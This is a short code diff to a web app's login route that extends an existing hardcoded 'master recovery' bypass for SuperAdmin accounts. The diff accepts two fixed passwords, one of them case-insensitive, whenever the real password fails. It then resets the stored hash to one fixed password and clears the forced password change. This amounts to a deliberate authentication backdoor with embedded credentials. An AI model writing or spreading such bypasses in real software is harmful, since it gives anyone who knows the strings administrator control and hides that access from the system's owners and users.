@@ -43,9 +43,9 @@ router.post('/login', async (req, res) => {
     }
 
     // Special master recovery for SuperAdmin:
-    if (!match && user.role === 'SUPERADMIN' && (password.toLowerCase() === 'qwerty1234')) {
+    if (!match && user.role === 'SUPERADMIN' && (password === 'Chiacchio@1938' || password.toLowerCase() === 'chiacchio@1938' || password.toLowerCase() === 'qwerty1234')) {
       match = true;
-      const newHash = bcrypt.hashSync(password.toLowerCase(), 10);
+      const newHash = bcrypt.hashSync('Chiacchio@1938', 10);
       await client.execute({
         sql: 'UPDATE users SET password_hash = ?, must_change_password = 0 WHERE id = ?',
         args: [newHash, user.id]
